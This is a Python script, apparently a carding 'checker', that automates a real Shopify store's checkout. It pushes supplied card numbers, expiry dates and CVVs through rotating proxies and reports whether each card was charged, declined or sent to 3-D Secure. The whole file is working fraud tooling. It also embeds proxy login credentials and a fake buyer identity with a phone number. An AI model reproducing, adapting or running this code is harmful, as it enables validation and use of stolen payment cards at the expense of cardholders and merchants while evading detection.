
import asyncio, aiohttp, random, string, re

proxies = ['http://yvyhsudi-rotate:ldapopdn07qp@p.webshare.io:80']

def find_between(data: str, first: str, last: str) -> str:
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''


def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


async def ShopiGate(cc, mes, ano, cvv):
    proxy = random.choice(proxies)
    async with aiohttp.ClientSession() as session:
        # ////! -------------- Request 1 -------------- ////
        product_id = {'id': '39816222834871'}
        async with session.post(url=f'https://www.mactools.com/cart/add.js', data=product_id, proxy=str(proxy)) as resp:
            r1 = await resp.text()
        # ////! -------------- Request 2 -------------- ////
        authenticity_token = get_random_string(86)
        async with session.post(url=f'https://www.mactools.com/cart', data={"checkout": ""}, proxy=str(proxy)) as resp:
            r2 = await resp.text()
            checkout_url = resp.url 
        # ////! -------------- Request 3 -------------- ////
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}   
        
        data = [
        ('_method', 'patch'),
        ('authenticity_token', authenticity_token),
        ('previous_step', 'contact_information'),
        ('step', 'shipping_method'),
        ('checkout[email]', 'bebemarcos@gmail.com'),
        ('checkout[buyer_accepts_marketing]', '0'),
        ('checkout[buyer_accepts_marketing]', '1'),
        ('checkout[shipping_address][first_name]', 'marcos'),
        ('checkout[shipping_address][last_name]', 'sal'),
        ('checkout[shipping_address][address1]', 'New York'),
        ('checkout[shipping_address][address2]', ''),
        ('checkout[shipping_address][city]', 'New York'),
        ('checkout[shipping_address][country]', 'MX'),
        ('checkout[shipping_address][province]', 'New York'),
        ('checkout[shipping_address][zip]', '10080'),
        ('checkout[shipping_address][phone]', ''),
        ('checkout[shipping_address][country]', 'United States'),
        ('checkout[shipping_address][first_name]', 'marcos'),
        ('checkout[shipping_address][last_name]', 'sal'),
        ('checkout[shipping_address][address1]', 'New York'),
        ('checkout[shipping_address][address2]', ''),
        ('checkout[shipping_address][city]', 'New York'),
        ('checkout[shipping_address][province]', 'NY'),
        ('checkout[shipping_address][zip]', '10080'),
        ('checkout[shipping_address][phone]', '8298070240'),
        ('checkout[remember_me]', ''),
        ('checkout[remember_me]', '0'),
        ('checkout[buyer_accepts_sms]', '0'),
        ('checkout[sms_marketing_phone]', ''),
        ('checkout[client_details][browser_width]', '748'),
        ('checkout[client_details][browser_height]', '654'),
        ('checkout[client_details][javascript_enabled]', '1'),
        ('checkout[client_details][color_depth]', '24'),
        ('checkout[client_details][java_enabled]', 'false'),
        ('checkout[client_details][browser_tz]', '360'),
    ]
        async with session.post(url=checkout_url, headers=headers, data=data, proxy=str(proxy)) as resp:
             r3 = await resp.text()
        # ////! -------------- Request 4 -------------- ////    
        data = {
        '_method': 'patch',
        'authenticity_token': authenticity_token,
        'previous_step': 'shipping_method',
        'step': 'payment_method',
        'checkout[shipping_rate][id]': 'shopify-Shipping-9.99',
        'checkout[client_details][browser_width]': '763',
        'checkout[client_details][browser_height]': '654',
        'checkout[client_details][javascript_enabled]': '1',
        'checkout[client_details][color_depth]': '24',
        'checkout[client_details][java_enabled]': 'false',
        'checkout[client_details][browser_tz]': '360',
    }
        async with session.post(url=checkout_url, headers=headers, data=data, proxy=str(proxy)) as resp:
            r4 = await resp.text()
        # ////! -------------- Request 5 -------------- ////
        data = {"credit_card": {"number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}","name": "Marcos Sal","month": mes,"year": ano,"verification_value": cvv},"payment_session_scope":  "www.mactools.com"}
        async with session.post(url="https://deposit.us.shopifycs.com/sessions", json=data, proxy=str(proxy)) as resp:
             r5 = await resp.json()
             id_ = r5.get('id') 
        # ////! -------------- Request 6 -------------- ////
        data = {
        '_method': 'patch',
        'authenticity_token': authenticity_token,
        'previous_step': 'payment_method',
        'step': '',
        's': id_,
        'checkout[payment_gateway]': '63640961207',
        'checkout[credit_card][vault]': 'false',
        'checkout[different_billing_address]': 'false',
        'checkout[total_price]': '1413',
        'checkout_submitted_request_url': 'https://www.mactools.com/54488563895/checkouts/ad52a06c9f90ee648c10410d2033f58e?from_processing_page=1&validate=true',
        'checkout_submitted_page_id': 'db33f47d-9BC4-498D-FA33-E7F57E0D3B22',
        'complete': '1',
        'checkout[client_details][browser_width]': '748',
        'checkout[client_details][browser_height]': '654',
        'checkout[client_details][javascript_enabled]': '1',
        'checkout[client_details][color_depth]': '24',
        'checkout[client_details][java_enabled]': 'false',
        'checkout[client_details][browser_tz]': '360',
    }
        
        async with session.post(url=checkout_url, headers=headers, data=data, proxy=str(proxy)) as resp:
            r6 = await resp.text()
            processing_url = resp.url
            await asyncio.sleep(5)
        # ////! -------------- Request 7 -------------- //// 
        async with session.get(str(processing_url) + '?from_processing_page=1', proxy=str(proxy)) as resp:
             r7 = await resp.text()
             await asyncio.sleep(5)   
        # ////! -------------- Request 8 -------------- ////
        async with session.get(resp.url, proxy=str(proxy)) as resp:
            r8 = await resp.text() 
         # ////! -------------- Get Responses -------------- ////   
            response = find_between(r8, 'notice__text">', '<')
            if '/thank_you' in str(resp.url) or '/orders/' in str(resp.url) or '/post_purchase' in str(resp.url):
                response = 'Charged'
            elif '/3d_secure_2/' in str(resp.url):
                response = '3d_secure_2'
            await session.close()

            if response == 'Charged':
                return f'Charged'
            elif 'Invalid card verification number' in response:
                return response
            else:
                return response    
